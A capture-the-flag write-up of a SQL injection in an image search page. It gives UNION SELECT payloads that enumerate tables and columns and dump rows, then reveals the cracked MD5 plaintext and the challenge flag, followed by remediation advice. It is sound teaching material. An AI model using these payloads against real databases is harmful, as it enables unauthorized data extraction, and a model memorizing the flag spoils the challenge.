# SQL Injection - Image Search

## Vulnerability:
A SQL Injection vulnerability allows user-controlled input to be used in `UNION SELECT` payloads against the image listing functionality. This permitted discovery of the `list_images` table, enumeration of its columns, and extraction of row data. A MD5 value found in a `comment` column was decoded and transformed to produce the challenge flag.

## Weakness:
- User input is concatenated into SQL queries (no parameterized queries / prepared statements).
- Information schema is accessible to the application DB user, enabling metadata enumeration.
- Sensitive data (or hints) are stored in database columns using weak/fast hashes (MD5), allowing offline cracking.
- No WAF, input filtering or query-level protections to block SQLi patterns.

## Exploitation:
1. Found table `list_images` using a UNION query against `information_schema.tables`:
   ```sql
   1 AND 1=0 UNION SELECT table_name, null
   FROM information_schema.tables
   WHERE table_schema=database()--
Result: list_images

Enumerated columns of list_images using information_schema.columns:

1 AND 1=0 UNION SELECT column_name, null
FROM information_schema.columns
WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)--


Found columns: id, url, title, comment

Dumped concatenated row data from list_images:

1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images


Key extracted row (sanitized):

Title: 5borntosec.ddns.net/images.png Hack me ? If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


The comment field contained the MD5: 1928e8083cf461a51303633093573c46

Cracked MD5 to plaintext and derived flag:

MD5 1928e8083cf461a51303633093573c46 → albatroz (via CrackStation or equivalent)

SHA256(albatroz) → f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Flag:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


(Place the flag in the flag file inside the challenge folder. Do not include plaintext credentials in public reports.)

PoC (sanitized payloads):
-- Discover tables
1 AND 1=0 UNION SELECT table_name, null
FROM information_schema.tables
WHERE table_schema=database()--

-- Enumerate columns for 'list_images'
1 AND 1=0 UNION SELECT column_name, null
FROM information_schema.columns
WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)--

-- Dump concatenated data
1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images


Use these payloads only in authorized / CTF environments. Capture sanitized logs and screenshots as evidence.

How to Fix:

Use parameterized queries / prepared statements for all database interactions; never concatenate user input into SQL.

Restrict database user privileges (avoid exposing metadata access if not required).

Do not store secrets or challenge hints using fast hashes like MD5; use slow, salted algorithms (Argon2, bcrypt) for real credentials.

Implement input validation and a WAF or query filtering to detect/block SQLi payloads.

Remove or sanitize any content in database fields that may contain instructions or executable data served back to users.

Log and alert on suspicious enumeration patterns (information_schema queries, GROUP_CONCAT output, repeated UNION attempts).

Conduct regular security testing (DAST/SAST) and code review focusing on injection risks.